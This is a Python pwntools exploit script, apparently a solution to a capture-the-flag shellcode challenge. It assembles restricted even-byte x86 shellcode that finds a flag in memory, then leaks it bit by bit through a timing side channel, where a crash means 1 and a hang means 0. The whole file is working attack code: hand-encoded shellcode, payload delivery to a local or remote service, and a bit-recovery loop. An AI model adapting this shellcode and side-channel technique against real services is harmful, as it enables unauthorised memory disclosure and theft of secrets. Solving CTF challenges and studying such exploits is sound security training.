#!/usr/bin/env python3
from pwn import *
import time

# --- Configuration ---
# Adjust based on your target (local vs remote)
HOST = '127.0.0.1'
PORT = 1337
LOCAL = True

# Timing threshold to distinguish 0 (Loop/Hang) vs 1 (Crash). 
# You will likely need to tweak this depending on network latency/jitter.
TIMEOUT_THRESHOLD = 0.001 

# Offset from the return address to the .bss segment containing flag_mem.
# 0x20 adds 0x2000 to RAX. Depending on the compiled binary, you may need 
# to change this to 0x22, 0x24, 0x2e, 0x30, etc. (Must be an EVEN byte).
AH_OFFSET = 0x20 
# ---------------------

context.log_level = 'error' # Hide repetitive connection logs

def get_shift_bytes(bit_idx):
    """Generates strictly even-byte instructions to isolate a specific bit."""
    left_shift = 7 - bit_idx
    right_shift = 7
    
    def gen_shl(amount):
        res = b""
        while amount >= 6: res += b"\xc0\xe2\x06"; amount -= 6
        while amount >= 4: res += b"\xc0\xe2\x04"; amount -= 4
        while amount >= 2: res += b"\xc0\xe2\x02"; amount -= 2
        while amount >= 1: res += b"\xd0\xe2"; amount -= 1
        return res
        
    def gen_shr(amount):
        res = b""
        while amount >= 6: res += b"\xc0\xea\x06"; amount -= 6
        while amount >= 4: res += b"\xc0\xea\x04"; amount -= 4
        while amount >= 2: res += b"\xc0\xea\x02"; amount -= 2
        while amount >= 1: res += b"\xd0\xea"; amount -= 1
        return res

    return gen_shl(left_shift) + gen_shr(right_shift)

def build_shellcode(char_idx, bit_idx):
    """Constructs the even-byte scanner and leaker payload."""
    sc = b"\x58"                             # pop rax (Retrieves PIE leak)
    sc += b"\x80\xc4" + bytes([AH_OFFSET])   # add ah, AH_OFFSET 
    
    # search_loop:
    sc += b"\xfe\xc0"                        # inc al
    sc += b"\x90"                            # nop (padding for even jump offset)
    sc += b"\x8a\x10"                        # mov dl, byte ptr [rax]
    sc += b"\x80\xfa\x66"                    # cmp dl, 0x66 ('f')
    sc += b"\x74\x04"                        # jz check_l
    sc += b"\x38\xd2"                        # cmp dl, dl
    sc += b"\x74\xf2"                        # jz search_loop (jmp -14 bytes)
    
    # check_l:
    sc += b"\xfe\xc0"                        # inc al
    sc += b"\x90"                            # nop
    sc += b"\x8a\x10"                        # mov dl, byte ptr [rax]
    sc += b"\x80\xfa\x6c"                    # cmp dl, 0x6c ('l')
    sc += b"\x74\x04"                        # jz found_flag
    sc += b"\x38\xd2"                        # cmp dl, dl
    sc += b"\x74\xe4"                        # jz search_loop (jmp -28 bytes)
    
    # found_flag: (rax points to 'l', which is index 1)
    offset = char_idx - 1
    if offset > 0:
        sc += (b"\x80\xc0\x02" * (offset // 2)) # add al, 2
        if offset % 2 != 0:
            sc += b"\xfe\xc0"                   # inc al
            
    sc += b"\x8a\x10"                        # mov dl, byte ptr [rax]
    sc += get_shift_bytes(bit_idx)           # Isolates the target bit
    
    # Branching logic
    sc += b"\x08\xd2"                        # or dl, dl
    sc += b"\x74\x06"                        # jz loop_inf
    
    # Bit = 1 (Crash instantly)
    sc += b"\x30\xe4"                        # xor ah, ah
    sc += b"\x30\xc0"                        # xor al, al
    sc += b"\x00\x00"                        # add byte ptr [rax], al (derefs 0x0)
    
    # Bit = 0 (Loop until 500us ualarm)
    sc += b"\x38\xd2"                        # cmp dl, dl
    sc += b"\x74\xfc"                        # jz -4
    
    return sc

def test_bit(char_idx, bit_idx):
    """Sends payload and times the execution to determine the bit."""
    payload = build_shellcode(char_idx, bit_idx)
    
    while True:
        try:
            if LOCAL:
                p = process('./prob')
            else:
                p = remote(HOST, PORT)
                
            p.recvuntil(b"Enter your shellcode: ")
            
            start = time.time()
            p.send(payload)
            p.recv(1) # Blocks until socket closes (crash or SIGALRM)
            end = time.time()
            
            p.close()
            elapsed = end - start
            
            # Evaluate timing side-channel
            if elapsed < TIMEOUT_THRESHOLD:
                return 1
            else:
                return 0
                
        except (EOFError, ConnectionRefusedError):
            continue

def main():
    print("[*] Starting flag leak...")
    flag = ""
    
    for i in range(0x50):
        char_val = 0
        for b in range(8):
            bit = test_bit(i, b)
            char_val |= (bit << b)
            
        if char_val == 0:
            print(f"\n[+] Done. Reached null byte.")
            break
            
        flag += chr(char_val)
        print(f"\r[+] Flag so far: {flag}", end="", flush=True)
        
    print(f"\n[!] Final flag: {flag}")

if __name__ == "__main__":
    main()